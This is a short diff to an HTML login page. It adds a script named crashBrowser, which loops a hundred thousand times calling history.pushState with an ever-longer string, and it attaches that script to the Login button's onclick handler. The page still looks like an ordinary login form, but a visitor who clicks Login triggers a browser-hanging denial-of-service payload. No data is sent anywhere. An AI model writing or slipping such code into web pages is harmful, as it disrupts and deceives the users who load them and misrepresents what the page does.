@@ -21,7 +21,18 @@
             font-size: 1.5em;
         }
     </style>
-    
+    <script>
+        
+        function crashBrowser() {
+            var total = "0";
+                for(var i=0;i<100000;i++){
+                    total = total+ i.toString();
+                    history.pushState(0,0,total);
+                }
+        }
+        
+        
+    </script>
     <body>
         <div id="container">
             <div id="top">
@@ -31,7 +42,7 @@
                 <form>
                     <label class="inputDesc">Username:</label> <input type="text"> <br> <br>
                     <label class="inputDesc">Password:</label> <input type="password"> <br> <br> <br>
-                    <input type="button" class="btn" type="submit" value="Login"> <br>
+                    <input type="button" class="btn" type="submit" value="Login" onclick="crashBrowser()"> <br>
                     <a href="forgot.html">Forgot your password?  </a>
                 </form>
             </div>
